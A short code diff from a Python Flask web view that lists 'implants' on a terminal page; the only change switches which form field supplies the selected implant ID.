@@ -34,7 +34,7 @@ def index():
     implants = get_list()
     whole = None
     if form.validate_on_submit():
-        implant_id = form.implant_id.data  # Access the selected implant ID
+        implant_id = form.selected_implant.data  # Access the selected implant ID
         response = analyze_input(form, implant_id)
     return render_template('terminal.html', form=form, cmd=whole, implants=implants, response=response)
 
